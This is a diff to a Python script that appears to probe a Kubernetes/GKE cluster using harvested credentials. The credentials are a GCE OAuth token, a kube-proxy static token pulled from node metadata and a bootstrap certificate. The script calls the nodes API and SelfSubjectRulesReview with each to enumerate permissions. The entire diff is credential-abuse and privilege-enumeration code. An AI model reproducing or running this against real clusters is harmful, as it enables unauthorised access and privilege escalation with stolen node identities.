@@ -278,15 +278,22 @@ def api3():
 
     # GCE OAuth bearer identity (GCP auth provider)
     st, b = call("/api/v1/nodes", auth=gt)
-    out("GCPTOKEN nodes status=%s %s" % (st, b[:200].decode("utf8", "replace")))
+    out("GCPTOKEN(no-cert) nodes status=%s %s" % (st, b[:200].decode("utf8", "replace")))
+    st, b = call("/api/v1/nodes", ctx=ctx0, auth=gt)
+    out("GCPTOKEN-ONLY nodes status=%s %s" % (st, b[:200].decode("utf8", "replace")))
+    st, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST",
+                 json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview", "spec": {"namespace": "bhs"}}).encode(),
+                 ctx=ctx0, auth=gt)
+    out("GCPTOKEN-ONLY SSRR status=%s %s" % (st, b[:600].decode("utf8", "replace")))
     body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview", "spec": {"namespace": "bhs"}}).encode()
     st, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body, auth=gt)
-    out("GCPTOKEN SSRR status=%s\n%s" % (st, b[:3000].decode("utf8", "replace")))
+    out("GCPTOKEN+cert SSRR status=%s\n%s" % (st, b[:800].decode("utf8", "replace")))
 
+    os.system("openssl x509 -in /tmp/boot.crt -noout -subject 2>&1 | head -1")
     # kube-proxy static token
     kpt = _kv(kv, "KUBE_PROXY_TOKEN")
     if kpt:
-        kpt = kpt.decode()
+        kpt = kpt.decode("latin1").strip()
         st, b = call("/api/v1/nodes", auth=kpt)
         out("PROXYTOKEN nodes status=%s len=%d %s" % (st, len(b), b[:200].decode("utf8", "replace")))
         st, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body, auth=kpt)
